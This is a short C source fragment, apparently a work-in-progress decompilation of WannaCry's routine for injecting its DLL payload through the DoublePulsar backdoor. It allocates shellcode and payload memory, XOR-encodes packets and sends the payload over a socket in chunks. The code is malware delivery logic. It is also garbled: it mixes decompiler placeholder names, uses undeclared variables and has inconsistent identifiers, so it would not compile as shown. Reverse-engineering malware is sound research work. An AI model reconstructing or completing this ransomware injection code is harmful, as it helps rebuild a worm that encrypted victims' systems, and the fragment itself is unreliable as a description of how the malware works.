/*

Attempts to decompile wannacry for the InjectWannacryViaDoublePulsar will be found here 


https://en.wikipedia.org/wiki/Bitwise_operations_in_C
https://www.programiz.com/c-programming/bitwise-operators
*/



SizeOfShellcode = 0x1800; //64 bits
//x86SizeOfShellcode = 0x1305; //32 bits
HGLOBAL *hMem = (char *)GlobalAlloc(0x40, SizeOfShellcode + 12 + (int)SizeOfDLLPayload);

TotalSize = Shellcode + (int)SizeOfDLLPayload;
if ((TotalSize & 0x80000003) != 0) {
      TotalSize = ((int)TotalSize >> 2) * 4 + 4;
}

iVar3 = (int)TotalSize >> 0xc;
SizeOfShellcode = TotalSize & 0x80000fff;

puVar4 = &WannacryEXECPacket;

int iStack;
int s;
 do {
  s = 0x1000;
  EncodePacket(LocalXORKEY,(int)register0x00000010,0xc);
  puVar4 = (hMem + v11);
  send(socket,&buf,4096,0);//0x1052
   iStack += 1;
   v11 = v11 + 0x1000;
 } while (iStack < iVar3);

if (SizeOfShellcode != 0) {
  SizeOfShellcodeShort = (short)SizeOfShellcode;
  in_stack_0000001e = ntohs(SizeOfDLLShort + 0x4e);
  in_stack_0000005f = SizeOfShellcodeShort + 0xd;
   EncodePacket(LocalXORKEY,(int)register0x00000010,0xc);
  puVar4 = (hMem + iVar3 * 0x1000);
  instack6a = iVar3 * 0x1000;
  iVar1 = send(SOCKET,&buf,SizeOfShellcode + 0x52,0);
}

